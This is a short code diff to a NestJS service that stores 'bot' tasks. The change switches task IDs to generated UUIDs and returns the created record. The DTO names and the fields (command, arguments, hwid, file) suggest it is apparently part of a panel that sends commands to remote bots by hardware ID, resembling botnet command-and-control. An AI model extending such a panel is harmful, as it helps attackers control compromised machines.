@@ -2,7 +2,7 @@ import { Injectable, Logger } from '@nestjs/common';
 import { PrismaService } from 'prisma/prisma.service';
 import { BotCheckinDto } from './dto/bot-checkin.dto';
 import { PanelSendBotTaskDto } from './dto/panel-send-bot-task.dto';
-
+import { v4 as uuidv4 } from 'uuid';
 
 @Injectable()
 export class PattayaMessagesService {
@@ -103,20 +103,20 @@ export class PattayaMessagesService {
         try {
 
             this.logger.log(`inseret new task, CREATED`)
-            await this.prisma.task.create({
+            const newTask = await this.prisma.task.create({
                 data: {
                     arguments: task.arguments,
                     command: task.command,
                     hwid: task.hwid,
-                    taskId: task.taskId,
+                    taskId: uuidv4(),
                     file: task.file
                 }
             })
 
-            return true;
+            return {success: true, data: newTask };
         } catch (error) {
             this.logger.error(`Something wrong`, error)
-            return false;
+            return {success: false, data: {} };
         }
       }
 }
